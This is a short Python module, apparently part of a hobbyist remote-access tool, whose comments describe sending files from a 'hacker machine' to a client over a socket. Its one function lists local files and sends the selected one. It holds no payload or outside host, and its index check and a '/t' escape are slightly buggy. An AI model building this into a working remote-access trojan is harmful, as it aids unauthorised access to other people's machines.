from glob import glob
import os

# read file from the disk into the program {hacker machine}
# read it in the form of bytes
# append a delimeter to the end of bytes
# transfer file over the network
# receive files on client side
# remove the delemeter frorm the bytes to recover the original data
# write the file on the client disk
# ****DONT SEND FOLDERS WITH THIS CODE****


def upload_files(my_socket):
    print("[+] Upload files")

    files = glob("*")
    for index, filename in enumerate(files):
        new_filename = os.path.basename(filename)
        print("/t", index, "\t", new_filename)

    while True:
        try:
            file_index = int(input("[+] Select file: "))
            if len(files) >= file_index >= 0:
                fileName = files[file_index]
                break
        except:
            print("[+] Invalid file selected")

    print("[+] Selected file = ", fileName)
    my_socket.send_data(fileName)  # this sends the filename

    my_socket.send_file(fileName)  # this sends the actual file
